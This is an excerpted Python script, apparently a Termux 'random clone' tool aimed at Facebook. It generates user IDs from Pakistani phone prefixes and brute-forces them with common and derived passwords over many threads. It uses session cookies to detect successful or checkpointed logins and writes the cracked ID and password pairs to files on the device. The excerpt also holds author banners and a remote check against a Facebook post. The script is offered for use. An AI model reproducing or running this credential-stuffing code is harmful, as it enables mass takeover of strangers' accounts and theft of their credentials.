...
\033[1;37m╔════════════════════════════════════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m  raman            \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m raman khan Form Afghanistan        \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m pukhtoon malang       \033[1;31m│
...
\033[1;37m╚🅑︎🅗︎🅣︎PRAY FOR ME ANYTIME [MR NAIB]\033[1;37m🅑︎🅗︎🅣︎╝
\033[1;91m==========================================================
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : pathan king")
    print("\t  Fb page  : salma malik")
    print("\t  Github   : pukhtoonmalang")
    print(c, 45*"-")
    print(47*"-")
    try:
        ...
        print("\t Welcome To MR NAIB- pukhtoon malang Tool ....")
        time.sleep(2)
    ...
    my_server=requests.get("https://www.facebook.com/100072001335695/posts/pfbid02ZG78gghaeEdjhr1Vo6MyvoHcPZkrCZcpH3ycnoEsswzLdVF5aZ8GueSYoHZxazael/?app=fbl").text
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_PUKHTOON_MALANG_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100072001335695 ");xyz()
    elif hamii in ["4","04"]:
...
def password1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN INDIA 🇵🇰")
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio pukhtoon_2F.mp3")
                    print('\r\033[1;34m[pukhtoon-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/PUKHTOON-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio pukhtoon_CP.mp3")
                    print(f'\r\033[1;30m[pukhtoon-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/pukhtoon-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[pukhtoonmalang🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
...
def password2():
    ...
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
    print(f" 0306 ,0340 ,0315 ,0333")
    print(f" 0341 ,0342 ,0335 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0340 / 0342 / 0306 / 0349 /0315 /0335  \033[0;m]")
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio PUKHTOON_OK.mp3")
                print('\r\033[1;32m[PUKHTOON-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/pukhtoon-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[PUKHTOON MALANG 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
...
def password5():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,code+love,'786786','123456','pakistan INDIA']
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio PUKHTOON-OK.mp3")
                print('\r\033[1;32m[PUKHTOON-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/PUKHTOON-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio PUKHTOON _CP.mp3")
                    print(f'\r\033[1;30m[PUKHTOON-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/PUKHTOON-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
